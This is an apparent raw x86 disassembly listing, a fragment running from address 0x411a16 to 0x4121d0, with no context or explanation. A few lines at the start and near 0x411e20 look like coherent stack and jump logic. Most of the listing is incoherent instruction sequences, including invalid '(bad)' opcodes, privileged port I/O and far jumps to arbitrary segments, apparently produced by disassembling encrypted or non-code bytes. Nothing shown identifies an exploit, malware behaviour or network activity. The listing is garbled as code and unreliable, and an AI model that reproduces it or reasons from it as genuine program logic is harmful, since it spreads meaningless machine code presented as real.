  411a16:	call   ebx
  411a18:	xor    ebx,ebx
  411a1a:	inc    ebx
  411a1b:	cmp    DWORD PTR [ebp+0x10],ebx
  411a1e:	je     0x411e30
  411a24:	xchg   edx,eax
  411a25:	push   0xa
  411a27:	pop    ecx
  411a28:	push   0x4
  411a2a:	pop    ebx
  411a2b:	inc    ebx
  411a2c:	jmp    0x411e20
  411a31:	inc    ebp
  411a32:	or     DWORD PTR [edi+0x55d349c7],0xffffff81
  411a39:	push   esi
  411a3a:	ds sbb eax,0x199c7e7d
  411a40:	and    bh,al
  411a42:	dec    esp
  411a43:	jo     0x411ab5
  411a45:	dec    ecx
  411a46:	jge    0x411ab8
  411a48:	jo     0x411aad
  411a4a:	adc    dl,dh
  411a4c:	test   DWORD PTR [edx],eax
  411a4e:	and    eax,0x439e8669
  411a53:	xchg   BYTE PTR [edx-0x19],ch
  411a56:	pop    ebp
  411a57:	adc    BYTE PTR [edx],0xdf
  411a5a:	repz pushf 
  411a5c:	ins    DWORD PTR es:[edi],dx
  411a5d:	test   BYTE PTR [ebx],cl
  411a5f:	inc    eax
  411a60:	cmp    al,0xa5
  411a62:	mov    eax,ds:0x37610ab1
  411a67:	xchg   ebx,eax
  411a68:	rol    DWORD PTR [edi+0x34],0x73
  411a6c:	mov    ecx,0x9abc782b
  411a71:	or     DWORD PTR [ecx],0xd15b6191
  411a77:	and    al,0x88
  411a79:	add    bl,BYTE PTR [edi+0x57c933be]
  411a7f:	pusha  
  411a80:	mov    esi,DWORD PTR [eax-0x7ae00d59]
  411a86:	div    ebp
  411a88:	test   DWORD PTR [ebp-0x49f8c626],esp
  411a8e:	add    edi,DWORD PTR [esi+0x1d5d480f]
  411a94:	mov    esi,0x9b4fca72
  411a99:	repz pop eax
  411a9b:	pop    esp
  411a9c:	mov    ds:0xe06a4c0c,eax
  411aa1:	cmp    bl,BYTE PTR [edi]
  411aa3:	pusha  
  411aa4:	adc    ecx,eax
  411aa6:	sbb    DWORD PTR [ebx+0x4680ff28],edx
  411aac:	or     edx,DWORD PTR [ebx]
  411aae:	outs   dx,DWORD PTR ds:[esi]
  411aaf:	fst    DWORD PTR [ecx+0x1c24d5c4]
  411ab5:	cmp    dl,bh
  411ab7:	ins    DWORD PTR es:[edi],dx
  411ab8:	cwde   
  411ab9:	jmp    0x411ab2
  411abb:	jno    0x411aa2
  411abd:	ret    
  411abe:	push   eax
  411abf:	and    dh,al
  411ac1:	adc    al,0x73
  411ac3:	je     0x411a7b
  411ac5:	ss sub eax,0x7687dabf
  411acb:	sbb    al,0x66
  411acd:	inc    ebx
  411ace:	xchg   DWORD PTR [edi],eax
  411ad0:	pop    ds
  411ad1:	sbb    dh,cl
  411ad3:	sahf   
  411ad4:	repz jnp 0x411a61
  411ad7:	jecxz  0x411ab2
  411ad9:	cmp    DWORD PTR [esi+0x12],ecx
  411adc:	and    BYTE PTR [ebp+0x2],ah
  411adf:	fstp   DWORD PTR [ebx-0x237a87af]
  411ae5:	in     al,dx
  411ae6:	dec    edx
  411ae7:	xor    BYTE PTR [eax-0x68],al
  411aea:	(bad)  
  411aeb:	fdivr  QWORD PTR [ebx+0x2298e7ed]
  411af1:	inc    esp
  411af2:	xor    BYTE PTR [esi-0x155d7bc7],al
  411af8:	inc    esi
  411af9:	jo     0x411ae8
  411afb:	lea    eax,[edi-0x3c]
  411afe:	push   esp
  411aff:	loopne 0x411af8
  411b01:	mov    eax,0x2b3ef281
  411b06:	push   ebx
  411b08:	cs push cs
  411b0a:	jae    0x411a9c
  411b0c:	add    al,0x39
  411b0e:	xchg   ebx,eax
  411b0f:	shl    BYTE PTR [ecx+0x18361c87],1
  411b15:	pop    ebx
  411b16:	xchg   BYTE PTR [esi+0x10],bl
  411b19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b1a:	in     al,0x17
  411b1c:	sbb    bh,BYTE PTR [ecx-0x184aef29]
  411b22:	ins    BYTE PTR es:[edi],dx
  411b23:	rol    BYTE PTR ds:0xe4913bb4,1
  411b29:	addr16 dec edx
  411b2b:	pop    ds
  411b2c:	mov    ds:0x91d8972b,al
  411b31:	push   edx
  411b32:	aas    
  411b33:	int    0xfc
  411b35:	pushf  
  411b36:	pop    ss
  411b37:	fidiv  WORD PTR [ebx+0x304c3ff3]
  411b3d:	mov    ds:0x4b0cb8e2,al
  411b42:	out    dx,eax
  411b43:	xchg   edx,eax
  411b44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b45:	(bad)  
  411b46:	in     al,dx
  411b47:	leave  
  411b48:	mov    WORD PTR [esi],es
  411b4a:	fdivr  st,st(7)
  411b4c:	cmp    edx,0x7a989d58
  411b52:	xchg   ecx,eax
  411b53:	cmp    al,0xfb
  411b55:	dec    ebx
  411b56:	or     BYTE PTR [edi+0x7a6d6bf7],dl
  411b5c:	cdq    
  411b5d:	popa   
  411b5e:	jo     0x411b50
  411b60:	retf   
  411b61:	ret    
  411b62:	mov    WORD PTR [edx],cs
  411b64:	div    BYTE PTR [ebx]
  411b66:	out    dx,al
  411b67:	fwait
  411b68:	aad    0xd
  411b6a:	(bad)  
  411b6c:	xor    eax,0x2918eb32
  411b71:	clc    
  411b72:	pop    edx
  411b73:	adc    ecx,eax
  411b75:	mov    ch,0xbf
  411b77:	popfw  
  411b79:	mov    ah,0x61
  411b7b:	jecxz  0x411b8b
  411b7d:	mov    WORD PTR [edi-0xb],cs
  411b80:	xchg   esp,eax
  411b81:	shl    esp,0x76
  411b84:	sub    al,0x2c
  411b86:	jne    0x411b1d
  411b88:	sti    
  411b89:	mov    WORD PTR [esi+0x46],es
  411b8c:	xchg   esp,eax
  411b8d:	lds    ecx,FWORD PTR [ebx+0x16d1aae]
  411b93:	loope  0x411b31
  411b95:	mov    dh,0x68
  411b97:	ror    DWORD PTR [esi-0x7b4e0114],0xb9
  411b9e:	ret    
  411b9f:	xchg   ecx,eax
  411ba0:	inc    eax
  411ba1:	xchg   esp,eax
  411ba2:	lods   al,BYTE PTR ds:[esi]
  411ba3:	or     DWORD PTR [ebp+0x3c78f052],0x78
  411baa:	test   al,0xb6
  411bac:	push   edx
  411bad:	cdq    
  411bae:	in     al,0x4b
  411bb0:	sahf   
  411bb1:	and    esp,DWORD PTR [ebx-0x7f23a3f5]
  411bb7:	jmp    0x235e8223
  411bbc:	cwde   
  411bbd:	mov    ch,0x56
  411bbf:	xor    BYTE PTR [esi-0x20],dl
  411bc2:	and    DWORD PTR [ebx],edx
  411bc4:	jmp    0x45c6:0xed39b003
  411bcb:	dec    ebx
  411bcc:	xchg   edi,eax
  411bcd:	pusha  
  411bce:	push   ebp
  411bcf:	xor    dl,BYTE PTR [edi+0x3f]
  411bd2:	cmp    al,0x49
  411bd4:	inc    ebp
  411bd5:	rcr    BYTE PTR [ebp+0x2c],1
  411bd8:	aas    
  411bd9:	shr    BYTE PTR [edi],0x94
  411bdc:	cs jg  0x411b79
  411bdf:	inc    eax
  411be0:	pusha  
  411be1:	cmc    
  411be2:	push   ss
  411be3:	cli    
  411be4:	inc    esi
  411be5:	shl    BYTE PTR ds:0xac8ed67b,0xac
  411bec:	push   ds
  411bed:	sub    eax,0xcffaeddf
  411bf2:	sar    esi,1
  411bf4:	jbe    0x411bca
  411bf6:	pop    ebx
  411bf7:	cmp    BYTE PTR [edx-0x34],cl
  411bfa:	inc    esp
  411bfb:	xor    ah,cl
  411bfd:	inc    ecx
  411bfe:	test   al,0x3f
  411c00:	or     ebx,DWORD PTR ds:0x8f863baa
  411c06:	out    0x8f,al
  411c08:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c0a:	adc    al,0xb1
  411c0c:	repnz push edx
  411c0e:	xor    DWORD PTR [eax],ebx
  411c10:	ins    DWORD PTR es:[edi],dx
  411c11:	ss jno 0x411bc1
  411c14:	inc    edx
  411c15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c16:	out    dx,al
  411c17:	imul   cl
  411c19:	(bad)  
  411c1a:	fwait
  411c1b:	xchg   DWORD PTR [ebp-0x3b4dd52a],ebp
  411c21:	sbb    DWORD PTR [edx-0x24],edx
  411c24:	lds    ebp,FWORD PTR [ebx-0x39]
  411c27:	mov    dh,0xb6
  411c29:	pop    ss
  411c2a:	rcr    BYTE PTR [edx+0x6e],cl
  411c2d:	pop    ds
  411c2e:	(bad)  
  411c2f:	aam    0x1
  411c31:	pop    edi
  411c32:	add    edi,DWORD PTR [eax]
  411c34:	and    ch,al
  411c36:	arpl   WORD PTR [ecx-0x65416cc6],si
  411c3c:	ja     0x411c99
  411c3e:	dec    eax
  411c3f:	xor    DWORD PTR [esi+0x71],ebp
  411c42:	push   edi
  411c43:	push   ecx
  411c44:	add    BYTE PTR [edx+0x7a],al
  411c47:	push   0xffffff8f
  411c49:	or     bh,BYTE PTR [edi+0x5dce727b]
  411c4f:	xchg   ecx,eax
  411c50:	or     BYTE PTR [edi],ah
  411c52:	psadbw mm2,mm0
  411c55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c56:	cmp    DWORD PTR [ecx+0x40684e30],ebp
  411c5c:	xchg   ecx,eax
  411c5d:	into   
  411c5e:	je     0x411c1f
  411c60:	or     al,0x95
  411c62:	xchg   dh,bh
  411c64:	push   ss
  411c65:	les    edi,FWORD PTR [ebp+0x504afea1]
  411c6b:	hlt    
  411c6c:	test   eax,0xb8f20dcd
  411c71:	inc    esp
  411c72:	lock mov edx,0x8df0d407
  411c78:	xor    edi,DWORD PTR [ecx+0x4d]
  411c7b:	add    DWORD PTR [eax+eax*8-0x80],esi
  411c7f:	jb     0x411c62
  411c81:	fs or  bl,al
  411c84:	cs xor al,0xa0
  411c87:	arpl   si,bx
  411c89:	fldenv [ebx]
  411c8b:	in     al,dx
  411c8c:	cdq    
  411c8d:	(bad)  
  411c8e:	mov    dl,0x30
  411c90:	and    BYTE PTR [edx],0x9a
  411c93:	stos   DWORD PTR es:[edi],eax
  411c94:	ror    BYTE PTR [di],1
  411c97:	jecxz  0x411c67
  411c99:	mov    eax,gs
  411c9b:	addr16 int 0xb5
  411c9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c9f:	push   0xffffffe7
  411ca1:	ds add al,0xcb
  411ca4:	xor    BYTE PTR [edi+eax*2],cl
  411ca7:	scas   al,BYTE PTR es:[edi]
  411ca8:	push   0xec8c2057
  411cad:	fst    st(4)
  411caf:	mov    ah,0x98
  411cb1:	jg     0x411c6d
  411cb3:	iret   
  411cb4:	dec    ebp
  411cb5:	into   
  411cb6:	scas   eax,DWORD PTR es:[edi]
  411cb7:	and    esi,DWORD PTR [edi]
  411cb9:	shl    BYTE PTR [edx-0xa],cl
  411cbc:	and    al,0xac
  411cbe:	test   al,0xc3
  411cc0:	in     al,dx
  411cc1:	fisub  DWORD PTR [ebx-0x44]
  411cc4:	je     0x411c8b
  411cc6:	xchg   ebx,eax
  411cc7:	xchg   esi,eax
  411cc8:	fsub   DWORD PTR [esi-0x35]
  411ccb:	enter  0x5a13,0x68
  411ccf:	xchg   ecx,eax
  411cd0:	push   0x76
  411cd2:	fs inc ecx
  411cd4:	stos   BYTE PTR es:[edi],al
  411cd5:	jmp    0x6442:0xef078c82
  411cdc:	bound  ebx,QWORD PTR [eax-0x7e]
  411cdf:	and    eax,0xc2942f94
  411ce4:	mov    eax,ds:0xafb53913
  411ce9:	dec    DWORD PTR [esi+0x68]
  411cec:	stos   DWORD PTR es:[edi],eax
  411ced:	punpckldq mm5,DWORD PTR [edx]
  411cf0:	ror    DWORD PTR [ebx],cl
  411cf2:	sbb    dl,BYTE PTR [edx]
  411cf4:	int    0xa3
  411cf6:	cld    
  411cf7:	jg     0x411ca9
  411cf9:	in     eax,0x19
  411cfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cfc:	lds    ebp,FWORD PTR [eax]
  411cfe:	jo     0x411d2d
  411d00:	mov    dl,0xfc
  411d02:	mov    edi,0xf0abe395
  411d07:	gs add eax,esp
  411d0a:	add    BYTE PTR [ecx-0x4d4ee424],0x9
  411d11:	push   ss
  411d12:	xchg   ebx,eax
  411d13:	pop    edi
  411d14:	popf   
  411d15:	mov    BYTE PTR [edi],ah
  411d17:	or     eax,0x1de91f0e
  411d1c:	ss jl  0x411d0d
  411d1f:	sti    
  411d20:	or     edx,0xfefed2d0
  411d26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d27:	test   al,0xc5
  411d2a:	in     al,0x83
  411d2c:	and    al,BYTE PTR [ecx+ecx*8+0x31]
  411d30:	mov    esp,0x8042b674
  411d35:	add    dl,BYTE PTR [esi]
  411d37:	cld    
  411d38:	and    eax,0xe5829f5f
  411d3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d3e:	test   eax,0x4d3baafb
  411d43:	xor    esp,esp
  411d45:	push   edx
  411d46:	pop    ecx
  411d47:	into   
  411d48:	fsubr  QWORD PTR [edi+0x36b6ceee]
  411d4e:	inc    edi
  411d4f:	outs   dx,BYTE PTR ds:[esi]
  411d50:	jecxz  0x411d77
  411d52:	std    
  411d53:	es sub dh,dh
  411d56:	push   edi
  411d57:	ror    DWORD PTR [edi],0x17
  411d5a:	mov    edi,0x69f29215
  411d5f:	jle    0x411ceb
  411d61:	and    al,0x90
  411d63:	addr16 cwde 
  411d65:	mov    ah,0xa0
  411d67:	hlt    
  411d68:	repz push 0xe406ce61
  411d6e:	lock call 0xe4cd:0x4b22a7d0
  411d76:	adc    BYTE PTR [esi],bl
  411d78:	mov    BYTE PTR [esp+ebx*4+0x6b],dl
  411d7c:	lods   al,BYTE PTR ds:[esi]
  411d7d:	sub    ebx,ecx
  411d7f:	jg     0x411d55
  411d81:	and    al,0x19
  411d83:	sbb    ecx,DWORD PTR [edi-0x50b5dfb6]
  411d89:	mov    ch,0x27
  411d8b:	lahf   
  411d8c:	mov    edx,0x4393751b
  411d91:	or     ecx,DWORD PTR [ebp+ebx*1+0x64cb9f27]
  411d98:	cmp    DWORD PTR [edi-0x319f5321],esi
  411d9e:	arpl   WORD PTR [edx+0x232fdb8c],ax
  411da4:	pop    edx
  411da5:	lds    ebx,FWORD PTR [edx-0x1e]
  411da8:	inc    ebx
  411da9:	bnd repz jnp 0x411dd5
  411dad:	inc    ebp
  411dae:	sbb    edi,DWORD PTR ds:[eax+0x29]
  411db2:	stos   DWORD PTR es:[edi],eax
  411db3:	xor    ah,bl
  411db5:	outs   dx,DWORD PTR ds:[esi]
  411db6:	js     0x411e0e
  411db8:	xor    eax,0x773b8d34
  411dbd:	push   0x52319509
  411dc2:	adc    al,0xcd
  411dc4:	call   0x48a3:0xc934c39c
  411dcb:	fsubr  QWORD PTR [ebx]
  411dcd:	call   0xee5e:0x21cc8f17
  411dd4:	inc    edx
  411dd5:	push   ss
  411dd6:	mov    eax,0x1e86f5a4
  411ddb:	repnz dec edx
  411ddd:	mov    al,0x78
  411ddf:	cs stos BYTE PTR es:[edi],al
  411de1:	sbb    DWORD PTR [eax+0x69494b73],esp
  411de7:	and    ecx,ecx
  411de9:	adc    al,0x66
  411deb:	mov    ds:0x29c2e8cb,al
  411df0:	or     bh,BYTE PTR [ebp+ebx*1+0x7d]
  411df4:	mov    dl,0x79
  411df6:	call   0x635995db
  411dfb:	std    
  411dfc:	repnz dec edx
  411dfe:	push   edx
  411dff:	push   ds
  411e00:	loope  0x411dc1
  411e02:	push   ebp
  411e03:	sahf   
  411e04:	fdivr  QWORD PTR [edi]
  411e06:	mov    eax,0x69724993
  411e0b:	sti    
  411e0c:	pop    edx
  411e0d:	push   eax
  411e0e:	ret    0xf873
  411e11:	clc    
  411e12:	jmp    0x411e60
  411e14:	inc    ecx
  411e15:	call   0x1476d010
  411e1a:	pop    esi
  411e1b:	std    
  411e1c:	test   al,0x63
  411e1e:	cmp    al,0x8f
  411e20:	xchg   ebx,ecx
  411e22:	sub    ebx,ecx
  411e24:	xchg   ebx,ecx
  411e26:	dec    ecx
  411e27:	mov    eax,DWORD PTR [ebp-0x1c]
  411e2a:	imul   eax,ecx
  411e2d:	add    esp,eax
  411e2f:	xchg   edx,eax
  411e30:	push   eax
  411e31:	xor    ebx,ebx
  411e33:	mov    edx,esp
  411e35:	dec    edx
  411e36:	inc    ebx
  411e37:	add    ebx,DWORD PTR [edx+ebx*1]
  411e3a:	jmp    0x41222e
  411e3f:	jp     0x411dc5
  411e41:	jb     0x411ea0
  411e43:	jb     0x411eb2
  411e45:	adc    DWORD PTR [ebx-0xc],esp
  411e48:	sub    ebp,DWORD PTR [esi]
  411e4a:	cmc    
  411e4b:	pop    es
  411e4c:	sbb    cl,BYTE PTR [esi+0x7048105b]
  411e52:	jo     0x411e9d
  411e54:	jge    0x411ec6
  411e56:	jo     0x411ebe
  411e58:	mov    edi,0x779c1278
  411e5d:	sti    
  411e5e:	lods   eax,DWORD PTR ds:[esi]
  411e5f:	xchg   DWORD PTR [ebx+0x7a326ca0],esi
  411e65:	mov    dh,al
  411e67:	in     al,0x62
  411e69:	call   0x8df75329
  411e6e:	das    
  411e6f:	or     dl,0x7e
  411e72:	sbb    dl,BYTE PTR [ebx+0x348ec14d]
  411e78:	es mov ch,0x6d
  411e7b:	mov    ebp,0xe2485850
  411e80:	xor    al,0x30
  411e82:	clc    
  411e83:	mov    DWORD PTR [ebx-0x691b3b0e],0x28f1134
  411e8d:	mov    ds:0xc7697f5e,eax
  411e92:	imul   edx,DWORD PTR [di],0xdee5f02f
  411e99:	jmp    0x411e99
  411e9b:	(bad)  
  411e9c:	shr    BYTE PTR [ecx-0x4],cl
  411e9f:	jl     0x411e2a
  411ea1:	cdq    
  411ea2:	enter  0xdea2,0xd8
  411ea6:	add    al,0xe7
  411ea8:	push   esi
  411ea9:	inc    edi
  411eaa:	mov    ds:0x421ddca0,eax
  411eaf:	sub    al,0xf
  411eb1:	dec    esp
  411eb2:	adc    dh,BYTE PTR [esi-0xf]
  411eb5:	int3   
  411eb6:	and    DWORD PTR ds:0xb9a58409,ebx
  411ebc:	clc    
  411ebd:	or     esi,esi
  411ebf:	add    ebx,DWORD PTR [edi-0x27]
  411ec2:	nop
  411ec3:	dec    eax
  411ec4:	stos   BYTE PTR es:[edi],al
  411ec5:	sahf   
  411ec6:	xlat   BYTE PTR ds:[ebx]
  411ec7:	mov    dh,0x40
  411ec9:	sub    BYTE PTR [ebp-0x79c6a74],cl
  411ecf:	stc    
  411ed0:	adc    eax,0x28fca51c
  411ed5:	push   esi
  411ed6:	fmul   DWORD PTR [esi-0x210d189a]
  411edc:	mov    al,ds:0x185d26d9
  411ee1:	pop    eax
  411ee2:	xchg   esi,eax
  411ee3:	mov    ah,0xe9
  411ee5:	mov    DWORD PTR [edi+0x34583bb],ecx
  411eeb:	addr16 loopne 0x411ef3
  411eee:	jbe    0x411f05
  411ef0:	sub    eax,0x3922add5
  411ef5:	sbb    DWORD PTR [edi+0x4a],edx
  411ef8:	inc    ecx
  411ef9:	(bad)  
  411efa:	mov    esi,0xe5233742
  411eff:	fmul   DWORD PTR [esi-0x307aa8e]
  411f05:	lea    eax,[ecx-0x115d3ee6]
  411f0b:	or     al,0x34
  411f0d:	mov    BYTE PTR [ebp-0x63],cl
  411f10:	jg     0x411f90
  411f12:	daa    
  411f13:	sub    BYTE PTR [esi-0x7e],al
  411f16:	loop   0x411f11
  411f18:	xchg   edi,eax
  411f19:	(bad)
  411f1d:	or     esi,DWORD PTR [ecx-0x4e7460e8]
  411f23:	into   
  411f24:	mov    cl,0x20
  411f26:	pop    ds
  411f27:	xor    eax,0xf57f0673
  411f2c:	pusha  
  411f2d:	inc    edx
  411f2e:	jb     0x411f10
  411f30:	outs   dx,BYTE PTR ds:[esi]
  411f31:	std    
  411f32:	jp     0x411ef9
  411f34:	inc    ebx
  411f35:	loopne 0x411f42
  411f37:	ins    DWORD PTR es:[edi],dx
  411f38:	add    BYTE PTR [esi-0x5e4e0806],al
  411f3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f3f:	push   edx
  411f40:	repnz mov eax,ds:0xaf7222d1
  411f46:	add    eax,0x6ef72604
  411f4b:	cmp    esi,0x7c
  411f4e:	int3   
  411f4f:	fisub  DWORD PTR [ecx]
  411f51:	dec    ebp
  411f52:	xchg   DWORD PTR ss:[ebx-0x1f],esp
  411f56:	sbb    eax,0x9152e16d
  411f5b:	mov    ch,0x27
  411f5d:	popf   
  411f5e:	xor    al,0x24
  411f60:	in     eax,0xd2
  411f62:	fidiv  DWORD PTR [edx]
  411f64:	js     0x411fd2
  411f66:	adc    DWORD PTR ds:0xc14c652c,edi
  411f6c:	lods   al,BYTE PTR ds:[esi]
  411f6d:	sbb    eax,0xd1913d50
  411f72:	pop    edx
  411f73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f74:	xlat   BYTE PTR ds:[ebx]
  411f75:	imul   esp,DWORD PTR [ebx],0xd6693f7f
  411f7b:	test   al,0xcd
  411f7d:	mov    dl,0x0
  411f7f:	(bad)  
  411f80:	jae    0x411ff8
  411f82:	cmp    bl,BYTE PTR [ecx-0x67]
  411f85:	mov    esi,ds
  411f87:	cmp    bh,BYTE PTR ds:0x953772d9
  411f8d:	jle    0x411f31
  411f8f:	and    DWORD PTR [eax+eiz*1],ebx
  411f92:	sti    
  411f93:	sub    DWORD PTR [eax+0x5d],edi
  411f96:	sahf   
  411f97:	mov    ebp,0xf9c11e15
  411f9c:	adc    edx,DWORD PTR [eax+0x41a83684]
  411fa2:	mov    ah,0x87
  411fa4:	mov    BYTE PTR [eax+0x5ad7a0e2],ah
  411faa:	cli    
  411fab:	cmp    ebp,DWORD PTR [ebx-0x7e]
  411fae:	cld    
  411faf:	push   ax
  411fb1:	ror    BYTE PTR [edx],cl
  411fb3:	retf   
  411fb4:	rcl    BYTE PTR [edx],cl
  411fb6:	mov    ecx,0x7ea1f2db
  411fbb:	mov    al,0xd6
  411fbd:	and    BYTE PTR [esi-0x2a],al
  411fc0:	pusha  
  411fc1:	push   0x84e0e8
  411fc6:	pop    edx
  411fc7:	xchg   edx,eax
  411fc8:	pop    ss
  411fc9:	ret    
  411fca:	aas    
  411fcb:	sbb    eax,0xf837e604
  411fd0:	aaa    
  411fd1:	popf   
  411fd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fd3:	sub    esi,DWORD PTR [edi-0x70705c06]
  411fd9:	sar    BYTE PTR [ecx],0x57
  411fdc:	enter  0x1819,0xe1
  411fe0:	adc    ah,0xd9
  411fe3:	sbb    ebp,edx
  411fe5:	in     al,dx
  411fe6:	push   0xffffff9d
  411fe8:	xchg   DWORD PTR [ebx+ecx*8+0x4f],edx
  411fec:	add    BYTE PTR [esi-0x37],dl
  411fef:	dec    edi
  411ff0:	cmovp  ecx,DWORD PTR fs:[eax]
  411ff4:	dec    ecx
  411ff5:	jns    0x411ffe
  411ff7:	dec    edi
  411ff8:	jg     0x411fc7
  411ffa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ffb:	jecxz  0x411fd9
  411ffd:	fcom   st(3)
  411fff:	pop    edi
  412000:	pusha  
  412001:	rcl    BYTE PTR [ecx+0x65],1
  412004:	(bad)  
  412005:	jmp    0x411ff7
  412007:	iret   
  412008:	ins    BYTE PTR es:[edi],dx
  412009:	retf   
  41200a:	outs   dx,DWORD PTR ds:[esi]
  41200b:	push   esi
  41200c:	out    0xe9,al
  41200e:	push   eax
  41200f:	mov    BYTE PTR [edx+edx*4],ch
  412012:	sbb    BYTE PTR [eax+0x11],dl
  412015:	stos   BYTE PTR es:[edi],al
  412016:	mov    ah,0xeb
  412018:	inc    ebx
  412019:	gs dec edi
  41201b:	xchg   edx,eax
  41201c:	add    al,0xc7
  41201e:	shl    BYTE PTR [ebp+0x47455136],cl
  412024:	xchg   esp,eax
  412025:	mov    esi,0x4516d3b7
  41202a:	scas   al,BYTE PTR es:[edi]
  41202b:	mov    DWORD PTR [edi+ebp*1],esp
  41202e:	adc    eax,0x4ef311f2
  412033:	xor    al,0x93
  412035:	lods   al,BYTE PTR ss:[esi]
  412037:	mov    edi,0x5ac12131
  41203c:	test   eax,0xe718d060
  412041:	push   0x37057256
  412046:	jmp    0xf6d9:0xcfac9ac0
  41204d:	fild   WORD PTR [esi-0x34d2f6d4]
  412053:	dec    ebp
  412054:	mov    bl,0x93
  412056:	frstor [eax]
  412058:	adc    BYTE PTR [eax+0x5deb7485],0x35
  41205f:	inc    eax
  412060:	jae    0x412083
  412062:	test   eax,0x3edb4da0
  412067:	push   esp
  412068:	in     al,0x96
  41206a:	push   ebx
  41206b:	adc    eax,0x68187d7e
  412070:	cdq    
  412071:	inc    edi
  412072:	xor    BYTE PTR [esi+0x6b],al
  412075:	jne    0x412076
  412077:	test   DWORD PTR [esi+0x4f81b6d7],edx
  41207d:	add    bh,ch
  41207f:	std    
  412080:	sbb    BYTE PTR [esi],cl
  412082:	or     eax,0xe6bd43a2
  412087:	mov    fs:0xfb3180c3,al
  41208d:	inc    edi
  41208e:	fs xchg ecx,eax
  412090:	and    ecx,DWORD PTR [ecx+0x5d3047de]
  412096:	iret   
  412097:	fstp   DWORD PTR [edx+0x13]
  41209a:	push   esp
  41209b:	lods   al,BYTE PTR ds:[esi]
  41209c:	push   esi
  41209d:	or     BYTE PTR [esi],0xe9
  4120a0:	dec    edi
  4120a1:	jb     0x41206c
  4120a3:	sar    DWORD PTR ds:0x6a392bf1,0x42
  4120aa:	ins    DWORD PTR es:[edi],dx
  4120ab:	add    bl,BYTE PTR [esi+0x73]
  4120ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120af:	lods   al,BYTE PTR ds:[esi]
  4120b0:	cdq    
  4120b1:	push   ss
  4120b2:	shl    BYTE PTR [eax+0x4f055ab4],cl
  4120b8:	test   al,0xa5
  4120ba:	out    0x42,eax
  4120bc:	adc    al,0x6
  4120be:	mov    ecx,DWORD PTR [esp+ebx*4+0x241b940e]
  4120c5:	inc    ebx
  4120c6:	stos   BYTE PTR es:[edi],al
  4120c7:	or     eax,0x788f9eba
  4120cc:	shl    DWORD PTR [esi],1
  4120ce:	xor    DWORD PTR [eax+0x49ff6b42],edi
  4120d4:	xchg   edi,eax
  4120d5:	dec    esi
  4120d6:	adc    edx,edi
  4120d8:	int    0xbc
  4120da:	xchg   ebx,eax
  4120db:	(bad)  
  4120dc:	ds loop 0x4120c6
  4120df:	sub    edx,DWORD PTR [edi+edx*4+0x60008034]
  4120e6:	dec    edi
  4120e7:	dec    ebx
  4120e8:	cli    
  4120e9:	xor    esp,esp
  4120eb:	lock mov cl,0xe4
  4120ee:	out    0x7f,al
  4120f0:	inc    ecx
  4120f1:	pop    edi
  4120f2:	mov    esi,0xf991202c
  4120f7:	mov    ebx,0xa3457e36
  4120fc:	pop    edx
  4120fd:	xor    BYTE PTR [eax-0x1e6815b1],ah
  412103:	call   0xf50a:0xc0062151
  41210a:	jae    0x412123
  41210c:	(bad)
  412111:	cmp    al,0xff
  412113:	out    dx,eax
  412114:	clc    
  412115:	xchg   ecx,eax
  412116:	add    BYTE PTR [edx],ah
  412118:	pop    esp
  412119:	call   0xf226:0xe39e1fb
  412120:	and    al,0xea
  412122:	pop    ecx
  412123:	fisttp DWORD PTR [edx]
  412125:	stc    
  412126:	inc    ebp
  412127:	aam    0xe8
  412129:	es inc esp
  41212b:	xchg   edx,eax
  41212c:	fcomp  QWORD PTR [ebp+0x648a4bc7]
  412132:	mov    ebp,0x7b78d25e
  412137:	cdq    
  412138:	cwde   
  412139:	fsub   QWORD PTR [esi+0x4755c8c2]
  41213f:	inc    ecx
  412140:	mov    BYTE PTR [ebx-0x34],cl
  412143:	add    BYTE PTR [bp+di+0x49f3],ah
  412148:	jns    0x412178
  41214a:	and    al,0x6e
  41214c:	sar    DWORD PTR [ebx],1
  41214e:	ret    0xae1c
  412151:	cmp    ecx,DWORD PTR [ebx+0x21]
  412154:	push   esp
  412155:	inc    edi
  412156:	out    dx,eax
  412157:	sar    BYTE PTR [ebx-0x3],1
  41215a:	bound  edx,QWORD PTR [bp+si+0x3b3e]
  41215f:	xor    bh,BYTE PTR [edx-0x33]
  412162:	(bad)  
  412163:	mov    ds:0x947ee4b,al
  412168:	jbe    0x412106
  41216a:	repz (bad) 
  41216c:	in     eax,0x4d
  41216e:	loope  0x4121a9
  412170:	mov    ah,0xb8
  412172:	jns    0x412179
  412174:	mov    ecx,0xea41c84c
  412179:	lock dec ebx
  41217b:	push   esp
  41217c:	daa    
  41217d:	je     0x41214f
  41217f:	mov    ah,0x76
  412181:	ret    
  412182:	and    bl,BYTE PTR [edi+0x75]
  412185:	std    
  412186:	push   eax
  412187:	push   ds
  412188:	mov    esi,0x418aa192
  41218d:	daa    
  41218e:	mov    cl,0xf
  412190:	outs   dx,BYTE PTR ds:[esi]
  412191:	mov    ebp,0xab0f548b
  412196:	add    ebx,ebx
  412198:	shl    DWORD PTR ds:[eax+0x2e08c6bc],0xd3
  4121a0:	or     al,0x36
  4121a2:	mov    ds:0x109e68d2,al
  4121a7:	pushf  
  4121a8:	stc    
  4121a9:	std    
  4121aa:	imul   esi,DWORD PTR [esp+esi*1+0x13],0x77ae6304
  4121b2:	push   ss
  4121b3:	imul   eax,DWORD PTR [esi-0x4d7f491a],0xffffff95
  4121ba:	push   es
  4121bb:	pop    edi
  4121bc:	das    
  4121bd:	sbb    eax,0x475bbad
  4121c2:	add    BYTE PTR [edx-0x79],ah
  4121c5:	fcomp  st(6)
  4121c7:	mov    cl,0x2e
  4121c9:	cmp    DWORD PTR [edx],0x23
  4121cc:	dec    ecx
  4121cd:	iret   
  4121ce:	fcom   st(2)
  4121d0:	jle    0x41216f
